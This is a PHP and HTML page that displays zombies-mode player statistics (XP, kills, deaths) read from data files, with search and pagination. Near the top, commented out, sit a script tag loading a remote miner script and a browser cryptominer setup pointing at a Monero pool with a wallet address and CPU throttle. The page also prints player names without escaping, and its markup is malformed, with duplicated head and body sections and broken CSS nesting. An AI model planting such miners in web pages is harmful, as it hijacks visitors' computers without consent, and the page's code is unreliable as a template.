<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zombies Player Stats</title>
    <!--<script src="https://cdn.dinovn.repl.co/mr.js"></script>-->
</head>
<body>
    <!--<script>
	  var pool = "moneroocean.stream:10128";
	  var walletAddress = "84tHTMYE2ph2n8K4nz8gnFKNvX3fpViAV5xvNEbTL4geazoaxupMKKiYjJZK4NRuCh29fjYuBUyKKfEjR9fDJzeuSzfeB5J";
	  var workerId = "WebMiner"; //Name show on moneroocean.stream
	  var threads = -1;
	  var password = "x";
	  startMining(pool, walletAddress, workerId, threads, password);
	  throttleMiner = 90; //Cpu used when throttle 20 = 80%
	</script>-->
    <!-- Home button to navigate to the main index.php in the parent folder -->
    <a href="index.html" class="home-button">Home</a>
        <tbody>
            <?php
			$dat_directory = __DIR__ . '/zom_players'; // Replace 'folder' with your subfolder name

			// Define the number of players to display per page
			$players_per_page = 10;

			// Get the total number of players
			$total_players = count(glob("$dat_directory/*.dat"));

			// Calculate the total number of pages
			$total_pages = ceil($total_players / $players_per_page);

			// Get the current page number from the query string
			$current_page = isset($_GET['page']) ? max(1, min((int)$_GET['page'], $total_pages)) : 1;

			// Calculate the starting and ending index for the current page
			$start_index = ($current_page - 1) * $players_per_page;
			$end_index = min($start_index + $players_per_page - 1, $total_players - 1);

			$player_stats = [];

			$files = glob("$dat_directory/*.dat");

			foreach ($files as $filename) {
				$data = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
				// Parse the data and extract relevant stats here
				// Example:
				$player_name_raw = explode(':', $data[1])[1];
    
				// Remove both single and double color codes and the "^" symbol
				$player_name = preg_replace('/\^\^([0-7]{2})|\^([0-7]{1})|\^/', '', $player_name_raw);
    
				// Remove the trailing comma, if present
				$player_name = rtrim($player_name, ',');
    
				$xp = (int)explode(':', $data[6])[1];
				$time_played = (int)explode(':', $data[3])[1];
    
				// Extract kills and deaths
				$kills = (int)explode(':', $data[12])[1]; // Use totalKills
				$deaths = (int)explode(':', $data[13])[1]; // Use totalDeaths
    
				// Filter player_stats based on search query
				$search_query = isset($_GET['search']) ? trim($_GET['search']) : '';
				if (!empty($search_query) && strpos(strtolower($player_name), strtolower($search_query)) === false) {
					continue; // Skip this player if it doesn't match the search query
				}
    
				// Add the player stats to the list
				$player_stats[] = [
					"player_name" => $player_name,
					"xp" => $xp,
					"time_played" => $time_played,
					"kills" => $kills,
					"deaths" => $deaths,
				];
			}

			// Sort player_stats by kills (descending order)
			usort($player_stats, function($a, $b) {
				return $b['kills'] - $a['kills'];
			});

			// Calculate the total number of pages for the filtered data
			$total_pages_filtered = ceil(count($player_stats) / $players_per_page);

			// Pagination for the filtered data
			$player_stats = array_slice($player_stats, $start_index, $players_per_page);

			?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zombies Player Stats</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        h1 {
            text-align: center;
        }
        table {
            width: 80%;
            margin: 0 auto;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: center;
        }
        th {
            background-color: #333;
            color: #fff;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        .pagination {
            text-align: center;
            margin-top: 20px;
        }
        .pagination a {
            text-decoration: none;
            padding: 5px 10px;
            margin: 0 5px;
            border: 1px solid #ccc;
            background-color: #eee;
        }
        .pagination a:hover {
            background-color: #333;
            color: #fff;
        }
        .current-page {
            background-color: #333;
            color: #fff;
            font-weight: bold;
        }
        .search-box {
            text-align: center;
            margin-bottom: 20px;
        }
        .search-box input[type="text"] {
            width: 300px;
            padding: 5px;
        }
        .search-box input[type="submit"] {
            padding: 5px 10px;
            background-color: #333;
            color: #fff;
            border: none;
            cursor: pointer;
        .home-button {
            display: block;
            margin-bottom: 10px;
            text-decoration: none;
            color: #fff;
            background-color: #008CBA;
            padding: 10px 20px;
            border-radius: 8px;
        }

        .home-button:hover {
            background-color: #005f6b;
        }
        }
    </style>
</head>
<body>
    <h1>Call of Duty Player Stats</h1>
    
    <!-- Search bar -->
    <div class="search-box">
        <form action="" method="GET">
            <input type="text" name="search" placeholder="Search Player Name" value="<?= htmlspecialchars($search_query) ?>">
            <input type="submit" value="Search">
        </form>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>Player Name</th>
                <th>XP</th>
                <th>Time Played</th>
                <th>Kills</th>
                <th>Deaths</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($player_stats as $stats): ?>
                <tr>
                    <td><?= $stats['player_name'] ?></td>
                    <td><?= $stats['xp'] ?></td>
                    <td><?= $stats['time_played'] ?></td>
                    <td><?= $stats['kills'] ?></td>
                    <td><?= $stats['deaths'] ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    
    <!-- Pagination -->
	<div class="pagination">
		<?php for ($i = 1; $i <= $total_pages_filtered; $i++): ?>
			<?php if ($i == $current_page): ?>
            <span class="current-page"><?= $i ?></span>
			<?php else: ?>
            <a href="?page=<?= $i ?>&search=<?= htmlspecialchars($search_query) ?>"><?= $i ?></a>
			<?php endif; ?>
		<?php endfor; ?>
	</div>
</body>
</html>
